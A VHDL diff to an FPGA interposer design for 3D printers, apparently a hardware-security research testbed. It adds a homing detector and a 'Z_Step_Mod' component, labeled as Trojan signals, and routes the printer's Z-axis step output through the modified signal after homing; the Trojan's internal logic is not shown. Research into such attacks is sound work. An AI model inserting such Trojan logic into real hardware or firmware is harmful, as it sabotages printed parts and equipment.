@@ -7,9 +7,10 @@ entity OffRAMPS_top is
     Port (
         -- Board Specific IO
         sysclk   : in std_logic;   -- System clock
-        led0_g   : out std_logic;  -- LED 0 Green
-        led0_r   : out std_logic;  -- LED 0 Red
+        led0_g   : out std_logic;  -- RGB LED 0 Green
+        led0_r   : out std_logic;  -- RGB LED 0 Red
         btn0     : in std_logic;   -- Button[0]
+        led_0    : out std_logic;  -- LED 0
 
         -- Thermocouple inputs
         i_THERM0_n_0 : in std_logic;  -- Thermocouple 0 Negative Single-ended input [0]
@@ -75,12 +76,41 @@ end OffRAMPS_top;
 
 architecture Behavioral of OffRAMPS_top is
 
+	COMPONENT DETECT_HOME
+	PORT(
+	    i_CLK    : in std_logic;
+        i_X_STEP : in std_logic;
+        i_Y_STEP : in std_logic;
+        i_Z_STEP : in std_logic;
+        i_X_MIN  : in std_logic;
+        i_Y_MIN  : in std_logic;
+        i_Z_MIN  : in std_logic;
+        o_homing_complete : out std_logic
+		);
+	END COMPONENT;
+
+    COMPONENT Z_Step_Mod
+    PORT (
+        clk                 : in  std_logic;
+        enable              : in  std_logic;
+        homing_complete     : in  std_logic;
+        z_step              : in  std_logic;
+        z_step_modified     : out std_logic
+    );
+    END COMPONENT;
+    
     -- Bypass mode control signals
-signal bypass_mode_en : std_logic := '0';
-signal button_debounce : std_logic_vector(1 downto 0) := "00";
-signal button_press : std_logic;
+    signal bypass_mode_en : std_logic := '0';
+    signal button_debounce : std_logic_vector(1 downto 0) := "00";
+    signal button_press : std_logic;
+    signal home_complete_buf :std_logic;
+    
+    -- Trojan Related Signals
+    signal z_step_modified : std_logic;
 
 begin
+
+    -- Button Press Detection
     button_press <= not button_debounce(1) and button_debounce(0);
 
     process (sysclk)
@@ -92,6 +122,29 @@ begin
             end if;
         end if;
     end process;
+
+    led_0 <= home_complete_buf;
+    
+    -- Homing Sequence detection Component
+    HomingDetector : DETECT_HOME PORT MAP(
+        i_CLK       => sysclk,
+        i_X_STEP    => i_X_STEP,
+        i_Y_STEP    => i_Y_STEP,
+        i_Z_STEP    => i_Z_STEP,
+        i_X_MIN     => i_X_MIN,
+        i_Y_MIN     => i_Y_MIN,
+        i_Z_MIN     => i_Z_MIN,
+        o_homing_complete => home_complete_buf
+    );
+    
+    
+    Z_mod : Z_Step_Mod PORT MAP (
+        clk                 => sysclk,
+        enable              => '1',
+        homing_complete     => home_complete_buf,
+        z_step              => i_Z_STEP,
+        z_step_modified     => z_step_modified
+    );
 
     -- BYPASS MUXs
     o_D10       <= 'Z' when bypass_mode_en = '0' else i_D10;
@@ -115,7 +168,7 @@ begin
     o_Z_EN      <= 'Z' when bypass_mode_en = '0' else i_Z_EN;
     o_Z_MAX     <= 'Z' when bypass_mode_en = '0' else i_Z_MAX;
     o_Z_MIN     <= 'Z' when bypass_mode_en = '0' else i_Z_MIN;
-    o_Z_STEP    <= 'Z' when bypass_mode_en = '0' else i_Z_STEP;
+    o_Z_STEP    <= z_step_modified when bypass_mode_en = '0' else i_Z_STEP;
 
     -- Currently, We are jumping the termocouple from ramps --> arduino
     -- Thermometer Enable output might combine two inputs or have a default state                               
